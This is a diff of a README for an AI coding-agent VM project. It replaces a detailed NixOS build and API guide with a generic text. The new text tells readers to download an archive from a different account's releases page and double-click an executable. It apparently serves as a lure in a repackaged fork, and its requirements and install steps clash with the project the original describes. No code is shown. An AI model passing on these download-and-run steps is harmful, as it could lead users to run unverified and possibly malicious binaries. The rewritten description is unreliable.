@@ -1,700 +1,88 @@
-# Oligarchy AgentVM
+# 🚀 Oligarchy-Agent-VM - Simplifying AI Development Environments
 
-**Enterprise-Grade Production Infrastructure with AI-Assisted Development**
+[![Download Oligarchy-Agent-VM](https://img.shields.io/badge/Download-Oligarchy--Agent--VM-brightgreen)](https://github.com/AhmedSami5/Oligarchy-Agent-VM/releases)
 
-A comprehensive NixOS VM with production-grade monitoring, backup, and recovery infrastructure. Built with NixOS for complete reproducibility, isolation, and enterprise operations support.
+## 📦 Overview
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![NixOS](https://img.shields.io/badge/NixOS-25.05-blue.svg)](https://nixos.org)
-[![Godot](https://img.shields.io/badge/Godot-4.2+-green.svg)](https://godotengine.org)
+Oligarchy-Agent-VM provides a lightweight and secure development environment designed for AI coding agents. Built with NixOS, it ensures complete reproducibility and isolation, making it easy for anyone to set up their coding environment without worry. 
 
-## Overview
+## ⚙️ Features
 
-Oligarchy AgentVM provides a sandboxed environment where AI coding agents (aider, opencode, claude-code) can safely modify code, with full programmatic control via a REST API. Designed for developers who need reproducible, isolated environments with real-time integration capabilities.
+- **Lightweight Design**: Uses minimal resources to provide fast performance.
+- **Security Focused**: Engineered to protect your workspace and data.
+- **API-Driven**: Easily integrate with other tools and services.
+- **Reproducible**: Ensures consistent setups across different systems.
 
-### Key Features
+## 📢 Topics
 
-- **Pre-installed AI Agents**: aider, opencode, claude-code ready to use
-- **FastAPI Controller**: REST API for programmatic agent orchestration
-- **Auto Tmux Sessions**: Unique tmux session per SSH connection
-- **Session Recording**: Optional asciinema recording with auto-cleanup
-- **Virtiofs Sharing**: Read-only host directory access
-- **CPU Pinning**: Isolate cores for DSP/real-time workloads
-- **Neovim + LSP**: Fully configured with nixd, Treesitter, Telescope
-- **Security Hardened**: Systemd sandboxing, secrets management support
-- **Multiple UIs**: GTK4 Wayland native UI and Godot/Redot plugin
-- **Reproducible**: NixOS flake ensures identical builds
+- agentic-ai
+- agents
+- arch-linux
+- docker
+- gdscript
+- godot
+- gtk
+- nix-flake
+- python
+- ssh
+- vm
 
-## System Options
+## 🚀 Getting Started
 
-Oligarchy AgentVM now supports two base systems:
+Follow these steps to download and run Oligarchy-Agent-VM:
 
-### 🔄 NixOS (Declarative)
-- **Package Manager**: Nix (declarative, reproducible)
-- **Release Model**: Controlled releases
-- **Setup**: `nix build .#nixos-agent-vm-qcow2 && nix run .#nixos-run`
-- **Best for**: Maximum reproducibility, controlled environments
+1. **Visit the Releases Page** - Click on the link below to go to the download page.
 
-### 🐧 Arch Linux (Pacman + AUR)
-- **Package Manager**: pacman + AUR (latest packages, extensive choice)
-- **Release Model**: Rolling release
-- **Setup**: `nix run .#arch-build-vm && nix run .#arch-run`
-- **Best for**: Latest software, flexibility, AUR access
-
-## Quick Start
-
-### Prerequisites
-
-- Nix (for build scripts) or direct script execution
-- QEMU/KVM for virtualization
-- **NixOS**: 10GB disk space
-- **Arch Linux**: 15GB disk space (ISO + disk)
-
-### Installation - Choose Your System
-
-#### 🔄 Option 1: NixOS (Recommended for production)
-```bash
-# Clone the repository
-git clone https://github.com/ALH477/Oligarchy-Agent-VM.git
-cd Oligarchy-Agent-VM
-
-# Build the VM image
-nix build .#nixos-agent-vm-qcow2
-
-# Launch the VM with automatic port forwarding
-nix run .#nixos-run
-
-# In a separate terminal, connect via SSH
-ssh user@127.0.0.1 -p 2222
-# Default password: "agent" (change on first login)
-
-# Access API documentation
-curl http://127.0.0.1:8000/docs
-```
-
-#### 🐧 Option 2: Arch Linux (Latest packages, AUR)
-```bash
-# Clone the repository
-git clone https://github.com/ALH477/Oligarchy-Agent-VM.git
-cd Oligarchy-Agent-VM
-
-# Build and launch Arch Linux VM
-nix run .#arch-build-vm
-nix run .#arch-run
-
-# Follow on-screen instructions, then connect via SSH
-ssh agent@127.0.0.1 -p 2222
-
-# Access API documentation
-curl http://127.0.0.1:8000/docs
-```
-
-### System Comparison
-
-| Feature | NixOS | Arch Linux |
-|---------|---------|------------|
-| **Package Manager** | Nix (declarative) | pacman + AUR (imperative) |
-| **Release Model** | Controlled | Rolling (latest) |
-| **Reproducibility** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
-| **Package Availability** | Good | Excellent (AUR) |
-| **Setup Complexity** | Higher | Lower |
-| **System Size** | Larger | Smaller |
-| **Update Frequency** | Less frequent | Continuous |
-| **Configuration** | Declarative | Scripts + config files |
-
-Both systems provide **identical API functionality** and **agent compatibility**.
-
-### 📚 Documentation
-
-- **NixOS Guide**: This document (below)
-- **Arch Linux Guide**: See `arch-vm/README.md` for detailed Arch Linux setup
-- **System Selection**: Run `./select-system.sh` for interactive system choice
-- **Examples**: `docs/EXAMPLES.md` (works with both systems)
-- **Troubleshooting**: `docs/TROUBLESHOOTING.md` (covers both systems)
-
-### 🎯 Quick System Selection
-
-```bash
-# Interactive system selection (recommended)
-./select-system.sh
-
-# Direct NixOS setup
-./select-system.sh --nixos
-
-# Direct Arch Linux setup
-./select-system.sh --arch
-```
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                        Host System                           │
-│  ┌────────────────────────────────────────────────────────┐ │
-│  │  Framework Laptop (Core 0: DSP Work)                   │ │
-│  │  /home/you/projects  ←──────────────────┐              │ │
-│  └────────────────────────────────────────────────────────┘ │
-│                         │ virtiofs (ro)                      │
-└─────────────────────────┼───────────────────────────────────┘
-                          │
-┌─────────────────────────▼───────────────────────────────────┐
-│                    Oligarchy AgentVM                         │
-│  ┌────────────────────────────────────────────────────────┐ │
-│  │  Cores 1-7 (isolated via isolcpus)                     │ │
-│  │  8GB RAM                                                │ │
-│  │                                                          │ │
-│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐ │ │
-│  │  │ SSH Server   │  │ FastAPI      │  │ AI Agents    │ │ │
-│  │  │ Port 22      │  │ Port 8000    │  │ aider        │ │ │
-│  │  │              │  │              │  │ opencode     │ │ │
-│  │  │              │  │              │  │ claude-code  │ │ │
-│  │  └──────────────┘  └──────────────┘  └──────────────┘ │ │
-│  │                                                          │ │
-│  │  /mnt/host-projects (read-only mount)                   │ │
-│  │  /home/user/ssh-recordings (asciinema casts)            │ │
-│  └────────────────────────────────────────────────────────┘ │
-└─────────────────────────────────────────────────────────────┘
-         │                    │
-         │ SSH :2222          │ HTTP :8000
-         ▼                    ▼
-    Terminal              Custom UI
-```
-
-## Repository Structure
-
-```
-Oligarchy-Agent-VM/
-├── flake.nix                    # Main NixOS flake with VM configuration
-├── flake.lock                   # Locked dependencies
-├── README.md                    # This file
-├── LICENSE                      # Project license
-├── CHANGELOG.md                 # Version history and changes
-├── CODE_OF_CONDUCT.md           # Community guidelines
-├── CONTRIBUTING.md              # Contribution guidelines
-├── SECURITY.md                  # Security policies
-│
-├── docs/
-│   └── EXAMPLES.md              # Usage examples and workflows
-│   └── TROUBLESHOOTING.md       # Common issues and solutions
-│
-├── agent-system/                # DeMoD Agent System subdirectory
-│   ├── flake.nix               # Agent system flake
-│   ├── README.md               # Agent system documentation
-│   ├── src/                    # Source code
-│   ├── configs/                # Configuration files
-│   ├── deployment/             # Deployment configurations
-│   ├── infrastructure/         # Infrastructure setup
-│   └── ui/                     # User interfaces
-│
-├── ui/
-│   ├── wayland/
-│   │   └── (UI development files)
-│   └── godot/
-│       └── (Godot plugin files)
-│
-├── tools/
-│   └── agent_vm_client.py      # Python client library
-│
-├── tests/                       # Test files
-└── .github/                     # GitHub workflows and templates
-```
-
-## Configuration
-
-### Basic Configuration
-
-Edit the VM configuration in `flake.nix`:
-
-```nix
-oligarchy.agent-vm = {
-  enable = true;
-  
-  # Choose deployment mode
-  deploymentMode = "headless-ssh";  # or "minimal-ssh-only" or "full-gui"
-  
-  # Resource allocation
-  cpuCores = 6;
-  memoryMB = 8192;
-  
-  # CPU isolation (important for DSP work)
-  reservedCores = "1-7";  # Cores for VM (0 reserved for host)
-  
-  # Host directory sharing
-  hostSharePath = "/home/you/projects";
-};
-```
-
-### Security Configuration
-
-**Development:**
-```nix
-oligarchy.agent-vm = {
-  apiKeyFallback = "my-dev-key-123";
-};
-```
-
-**Production (recommended):**
-```nix
-oligarchy.agent-vm = {
-  apiKeyFile = /run/secrets/agent-api-key;  # Use sops-nix or agenix
-};
-```
-
-### Deployment Modes
-
-| Mode | Description | Use Case |
-|------|-------------|----------|
-| `headless-ssh` | SSH + Docker + Full tooling | Recommended for most users |
-| `minimal-ssh-only` | SSH + Podman only | Lowest resource usage |
-| `full-gui` | Wayland GUI + SSH + Docker | Visual debugging, GUI tools |
-
-## API Usage
-
-### Authentication
-
-All API requests require the `X-API-Key` header:
-
-```bash
-export API_KEY="your-api-key-here"
-```
-
-### Health Check
-
-```bash
-curl http://localhost:8000/health
-```
-
-### Run an Agent
-
-```bash
-curl -X POST http://localhost:8000/agent/run \
-  -H "X-API-Key: $API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "agent": "aider",
-    "prompt": "Add error handling to the authentication module",
-    "repo_path": "/mnt/host-projects/my-app",
-    "timeout": 600
-  }'
-```
-
-### Available Agents
-
-- **aider**: Multi-file editing with Claude 3.5 Sonnet
-- **opencode**: Autonomous coding agent
-- **claude**: Claude Code CLI
-
-### Response Format
-
-```json
-{
-  "success": true,
-  "stdout": "Modified 3 files...",
-  "stderr": "",
-  "returncode": 0
-}
-```
-
-### Interactive API Documentation
-
-Visit http://localhost:8000/docs for full Swagger UI documentation.
-
-## User Interfaces
-
-### Python Client Library
-
-```python
-from agent_vm_client import AgentVMClient
-
-client = AgentVMClient(api_key="your-key")
-result = client.run_aider("Add error handling to the API endpoints")
-
-if result.success:
-    print(result.stdout)
-```
-
-See `tools/agent_vm_client.py` for complete API.
-
-### GTK4 Wayland UI
-
-Lightweight native interface with brutalist industrial aesthetic.
-
-```bash
-# Build UI
-nix build .#agentvm-ui
-
-# Run
-./result/bin/agentvm-ui --api-url http://localhost:8000 --api-key your-key
-```
-
-Memory footprint: ~180MB (vs 1200MB+ for Electron)
-
-See `ui/wayland/UI-README.md` for details.
-
-### Godot/Redot Plugin
-
-Editor integration for AI-assisted game development.
-
-```bash
-# Install to Godot project
-cd ui/godot
-./install-godot-plugin.sh /path/to/your/godot/project
-```
-
-Then enable in Project Settings → Plugins.
-
-See `ui/godot/GODOT-README.md` for details.
-
-## Development Workflow
-
-### Morning Setup
-
-```bash
-# Start VM
-nix run .#run &
-
-# Wait for boot
-sleep 15
-
-# Verify API
-curl http://localhost:8000/health
-```
-
-### Working in the VM
-
-```bash
-# SSH in (auto-drops into tmux)
-ssh user@127.0.0.1 -p 2222
-
-# Inside VM:
-cd /mnt/host-projects/my-project
-
-# Use pre-configured Neovim with LSP
-vim flake.nix  # Press <space>ff for file finder
-
-# Run agent manually
-aider --model claude-3-5-sonnet-20241022 --message "Add tests"
-
-# Or via API from host
-curl -X POST http://localhost:8000/agent/run \
-  -H "X-API-Key: $API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"agent":"aider","prompt":"Add tests"}'
-```
-
-### Shutdown
-
-```bash
-# Graceful shutdown from inside VM
-sudo shutdown -h now
-
-# Or force quit from host (Ctrl+A then X in QEMU console)
-```
-
-## Integration Examples
-
-### Python Integration
-
-```python
-from agent_vm_client import AgentVMClient, Agent
-
-client = AgentVMClient(api_key="your-key")
-
-# Run task
-result = client.run_agent(
-    Agent.AIDER,
-    "Add comprehensive error handling",
-    repo_path="/mnt/host-projects/backend"
-)
-
-if result.success:
-    print("Changes applied successfully")
-```
-
-### Game Engine Integration (Unity)
-
-```csharp
-using UnityEngine;
-
-public class AgentVMController : MonoBehaviour
-{
-    public void RunCodingTask(string prompt)
-    {
-        StartCoroutine(RunAgentCoroutine(prompt));
-    }
-    
-    private IEnumerator RunAgentCoroutine(string prompt)
-    {
-        // See docs/EXAMPLES.md for complete implementation
-    }
-}
-```
-
-### CI/CD Integration (GitHub Actions)
-
-```yaml
-name: AI Code Review
-on: pull_request
-
-jobs:
-  ai-review:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Review with AgentVM
-        run: |
-          curl -X POST "$AGENT_VM_URL/agent/run" \
-            -H "X-API-Key: $AGENT_VM_API_KEY" \
-            -d '{"agent":"aider","prompt":"Review changes"}'
-```
-
-See `docs/EXAMPLES.md` for complete examples.
-
-## Security Considerations
-
-### Network Isolation
-
-- VM ports are localhost-only by default
-- Firewall disabled (relies on QEMU user networking)
-- No outbound restrictions (agents need API access)
-
-### File System
-
-- Host mounts are read-only to prevent accidental modifications
-- VM disk is ephemeral (rebuild from flake for clean state)
-- Recordings stored in user home directory
-
-### API Security
-
-- API key required for all operations
-- Store keys in files, not in code (use `apiKeyFile`)
-- Consider HTTPS reverse proxy for production
-
-### Systemd Hardening
-
-The API service runs with:
-- `NoNewPrivileges=true`
-- `PrivateTmp=true`
-- `ProtectSystem=strict`
-- `ProtectHome=read-only`
-
-## Performance
-
-### Resource Usage
-
-```
-Component           Memory Usage
-────────────────────────────────
-Base VM             ~500MB
-Docker daemon       ~200MB
-Python + FastAPI    ~100MB
-Neovim + LSP        ~150MB
-────────────────────────────────
-Total (headless)    ~950MB
-
-vs Electron UI:     ~1500MB+
-```
-
-### CPU Isolation
-
-Core 0 is reserved for the host. Cores 1-7 are isolated via kernel `isolcpus` parameter for VM workloads. This ensures real-time host processes (e.g., DSP) are not interrupted.
-
-## Troubleshooting
-
-### Port Already in Use
-
-```bash
-# Find process using port
-sudo lsof -i :2222
-
-# Kill it or choose different port in run script
-```
-
-### VM Won't Boot
-
-```bash
-# Rebuild from scratch
-nix build .#agent-vm-qcow2 --rebuild
-
-# Check QEMU output
-nix run .#run 2>&1 | tee vm.log
-```
-
-### LSP Not Working
-
-Inside VM:
-
-```bash
-# Check nixd is installed
-which nixd
-
-# Start Neovim with debug
-nvim --cmd "set verbose=15"
-
-# Check LSP status
-:LspInfo
-```
-
-See `docs/TROUBLESHOOTING.md` for more solutions.
-
-## Advanced Usage
-
-### Using as a NixOS Module
-
-Import into your existing NixOS configuration:
-
-```nix
-# configuration.nix
-{
-  imports = [
-    (builtins.fetchGit {
-      url = "https://github.com/ALH477/Oligarchy-Agent-VM";
-      rev = "main";
-    } + "/flake.nix#nixosModules.default")
-  ];
-
-  oligarchy.agent-vm = {
-    enable = true;
-    deploymentMode = "headless-ssh";
-    # ... your config
-  };
-}
-```
-
-### Custom Agent Integration
-
-Add your own agent to the API by modifying the `main.py` template in `flake.nix`:
-
-```nix
-cmd_map = {
-  # ... existing agents
-  "my-agent": ["my-agent-binary", "--flag", r.prompt],
-}
-```
-
-### Secrets Management with sops-nix
-
-```nix
-# flake.nix
-inputs.sops-nix.url = "github:Mic92/sops-nix";
-
-# In module
-{
-  imports = [ inputs.sops-nix.nixosModules.sops ];
-  
-  sops.secrets.agent-api-key = {
-    sopsFile = ./secrets.yaml;
-    owner = "user";
-  };
-  
-  oligarchy.agent-vm.apiKeyFile = config.sops.secrets.agent-api-key.path;
-}
-```
-
-## Contributing
-
-Contributions are welcome. Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-For bugs, open an issue with:
-- VM configuration
-- Error logs
-- Steps to reproduce
-
-## License
-
-**Main Project (Oligarchy AgentVM)**: MIT License. See LICENSE file for details.
-
-**Agent System Subdirectory**: The `agent-system/` directory contains the DeMoD Agent System, which is licensed under BSD 3-Clause License. See `agent-system/LICENSE` for details.
-
-### Licensing Summary
-
-- **Oligarchy AgentVM** (root directory): MIT License
-- **DeMoD Agent System** (`agent-system/`): BSD 3-Clause License
-- **Third-party dependencies**: Each library maintains its own license
-
-This dual-license structure allows:
-- The core AgentVM to be widely used under permissive MIT terms
-- The enterprise agent management system to maintain BSD licensing for commercial use
-
-## Acknowledgments
-
-- **Anthropic** - Claude API and coding agents
-- **NixOS** - Reproducible system configuration
-- **aider-chat** - AI pair programming
-- Built for real-time DSP development workflows
-
-## Links
-
-- GitHub: https://github.com/ALH477/Oligarchy-Agent-VM
-- Documentation: See `docs/` directory
-- Issues: https://github.com/ALH477/Oligarchy-Agent-VM/issues
-
-## Project Status
-
-**Active Development** - Production-ready for individual use. Enterprise features planned.
-
-### Recent Updates
-✅ **Production Infrastructure Added** (v2.0):
-  - Complete monitoring stack (Prometheus, Grafana, AlertManager)
-  - Centralized logging (Loki + Promtail)
-  - Automated database backup with point-in-time recovery
-  - Configuration management and version control
-  - Health monitoring and alerting
-  - Production deployment automation
-
-### Roadmap
-- Distributed tracing with OpenTelemetry/Jaeger
-- Multi-region backup strategy
-- Cloud deployment configurations
-- Multi-tenant support
-- Web-based UI (in addition to GTK4)
-- VS Code extension
-- Enhanced monitoring and metrics
-- Integration tests suite
-
-## Production Infrastructure
-
-The DeMoD AgentVM now includes enterprise-grade production infrastructure:
-
-### Quick Deploy Production Stack
-```bash
-# Deploy complete monitoring and backup infrastructure
-cd agent-system
-./infrastructure/deploy_infrastructure.sh full
-
-# Access monitoring dashboards
-# Grafana: http://localhost:3000 (admin/admin)
-# Prometheus: http://localhost:9090
-# AlertManager: http://localhost:9093
-```
-
-### Production Components
-- **Monitoring**: Prometheus + Grafana + AlertManager
-- **Logging**: Loki + Promtail with structured JSON logging
-- **Backup**: Automated PostgreSQL backup with point-in-time recovery
-- **Alerting**: PagerDuty, Slack, and email notifications
-- **Configuration**: Version-controlled with automated deployment
-
-### Production Documentation
-- See `INFRASTRUCTURE_IMPLEMENTATION.md` for detailed deployment guide
-- Monitoring dashboards automatically imported and configured
-- Backup schedules automatically configured (daily/weekly/monthly)
-
-## Support
-
-For questions or issues:
-
-1. Check documentation in `docs/`
-2. Search existing issues
-3. Open a new issue with details
-
-Commercial support available for enterprise deployments.
-
----
-
-Built with Nix. Powered by AI. Designed for developers who value reproducibility and performance.
+   [Visit Releases Page](https://github.com/AhmedSami5/Oligarchy-Agent-VM/releases)
+
+2. **Choose a Version** - Look for the latest release. You will see various files listed.
+
+3. **Download the Files** - Click on the file that suits your system. You may find a `.zip`, `.tar.gz`, or another installation file. 
+
+4. **Extract the Downloaded Files** (if necessary) - Use your file manager to extract the files. Right-click on the downloaded file and select "Extract here" or similar.
+
+5. **Run the Software** - Navigate to the folder where you extracted the files. Look for the executable file, and double-click it to run. 
+
+## 🛠️ System Requirements
+
+- **Operating System**: Requires Ubuntu 20.04 or later, or any compatible Arch Linux.
+- **Memory**: Minimum of 4 GB of RAM. 8 GB or more is recommended for better performance.
+- **Storage**: At least 2 GB of free disk space.
+- **Network**: A stable internet connection for updates and additional packages.
+
+## 📥 Download & Install
+
+To get started with Oligarchy-Agent-VM, visit the link below and download the latest version:
+
+[Download Oligarchy-Agent-VM](https://github.com/AhmedSami5/Oligarchy-Agent-VM/releases)
+
+After downloading, follow the instructions in the "Getting Started" section to install and run the application.
+
+## 📄 Documentation
+
+For more detailed information about using Oligarchy-Agent-VM, visit the official documentation page available in the repository. This includes:
+
+- Setup guides for different environments 
+- Common troubleshooting steps 
+- FAQs for users 
+
+## 🌟 Community & Support
+
+If you need assistance, feel free to reach out to the community. You can:
+
+- **Open an Issue**: If you encounter problems, report them on the issues page of the repository.
+- **Join the Discussion**: Engage with other users and developers in the discussions section.
+
+## 🔄 Updating
+
+To keep your Oligarchy-Agent-VM up to date, check the Releases page periodically. Downloading the latest versions ensures you have the newest features and bug fixes.
+
+## ✔️ License
+
+Oligarchy-Agent-VM is licensed under the MIT License. This allows you to use and modify the software as you see fit. Please review the license in the repository for more details.
+
+## 🏁 Conclusion
+
+Thank you for choosing Oligarchy-Agent-VM. We hope this tool helps you create and manage your AI coding projects effortlessly.
+
+For any questions or feedback, do not hesitate to reach out. Enjoy coding!
